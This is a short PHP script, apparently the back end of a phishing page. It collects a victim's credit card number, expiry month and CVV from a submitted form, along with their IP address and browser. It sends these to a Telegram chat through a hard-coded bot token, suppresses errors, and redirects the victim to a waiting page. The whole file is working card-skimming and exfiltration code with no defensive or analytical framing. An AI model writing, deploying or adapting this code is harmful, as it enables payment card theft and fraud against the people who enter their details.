<?php

// Get IP address - compatible with all servers
$zabi = isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : (getenv("REMOTE_ADDR") ? getenv("REMOTE_ADDR") : 'Unknown');

// Initialize message
$message = "";

$message .= "-----------------\n";
$message .= "CC : ".(isset($_POST['aa']) ? $_POST['aa'] : 'N/A')."\n";
$message .= "Month : ".(isset($_POST['bb']) ? $_POST['bb'] : 'N/A')."\n";
$message .= "Cvv : ".(isset($_POST['cc']) ? $_POST['cc'] : 'N/A')."\n";
$message .= "----------- IP Infos -------\n";
$message .= "IP       : $zabi\n";
$message .= "BROWSER  : ".(isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : 'Unknown')."\n";
$message .= "------------------------------------\n";

// ----------  ----------
$botConfigs = [
    [
        'token'   => '8873240104:AAHoZ56Ciq_oFjiGMTDukHa15SMufHNejGc', 
        'chat_id' => '-5191651553'                                 
    ],
    [
        'token'   => '8873240104:AAHoZ56Ciq_oFjiGMTDukHa15SMufHNejGc',                      
        'chat_id' => '-5191651553'                         
    ]
];
// ---------------------------------------------------

// Send to both bots
foreach ($botConfigs as $bot) {
    $data = [
        'text' => $message,
        'chat_id' => $bot['chat_id']
    ];

    // Send via Telegram API – errors suppressed
    @file_get_contents("https://api.telegram.org/bot" . $bot['token'] . "/sendMessage?" . http_build_query($data));
}

// Redirect after sending
header("Location: wait.html?from=card");
exit();

?>
